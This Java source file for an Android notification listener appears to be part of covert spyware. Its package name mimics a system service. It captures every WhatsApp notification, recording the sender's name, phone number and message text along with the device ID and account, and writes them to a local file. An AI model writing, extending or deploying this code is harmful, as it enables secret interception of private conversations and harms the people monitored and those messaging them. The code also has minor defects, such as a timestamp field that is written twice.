package system.android.services.imei;

import android.app.Notification;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Calendar;

/**
 * Created by dave on 25/6/16.
 */
public class NotificationListener extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        Notification notification = sbn.getNotification();
        Bundle extras = notification.extras;
        if (sbn.getPackageName().contains("com.whatsapp") && !extras.get("android.text").toString().toLowerCase().contains("new messages")) {
            JSONObject jsonObject = createJsonObject(sbn);
            Log.d("whatsapp", jsonObject.toString());
            if (jsonObject != null)
                FIleHandler.saveData(this, "whatsapp", jsonObject, true);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
    }

    private JSONObject createJsonObject(StatusBarNotification sbn) {
        Bundle extras = sbn.getNotification().extras;

        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("name", extras.get("android.title"));
            String number = "";
            try {
                number = sbn.getTag().substring(0, 12);
            } catch (Exception e) {
                number = "";
            }
            SharedPreferences sharedPreferences = getSharedPreferences("shared", MODE_PRIVATE);

            jsonObject.put("deviceId", sharedPreferences.getString("deviceId", "anonyms"));
            jsonObject.put("account", sharedPreferences.getString("account", "anonyms"));
            jsonObject.put("number", "" + number);
            jsonObject.put("message", extras.get("android.text"));
            jsonObject.put("time", "" + sbn.getPostTime());
            jsonObject.put("time", "" + Calendar.getInstance().getTime());

            return jsonObject;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }
}
